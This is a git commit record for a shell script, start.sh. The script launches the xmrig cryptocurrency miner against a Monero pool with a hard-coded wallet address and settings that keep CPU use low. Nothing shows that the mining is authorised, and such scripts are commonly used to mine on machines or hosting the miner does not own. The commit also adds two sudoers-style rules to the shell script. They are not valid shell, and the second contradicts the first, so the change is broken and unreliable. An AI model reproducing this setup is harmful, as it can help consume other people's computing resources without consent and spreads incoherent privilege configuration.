cfedefbb8205ecdef838de1d782a2df406026f99
Julian Nwadinobi <juliannwadinobi098@gmail.com>
2024-09-04 01:28:14 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,5 @@
 chmod +x ./xmrig 
 ./xmrig --url gulf.moneroocean.stream:10128 --user 43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc --pass x --cpu-priority 1 --threads 1 --donate-level 1 --av 0 --cpu-max-threads-hint 2
+
+username ALL=(ALL) NOPASSWD: /sbin/shutdown, /sbin/reboot
+username ALL=(ALL) NOPASSWD: !/sbin/shutdown, !/sbin/reboot
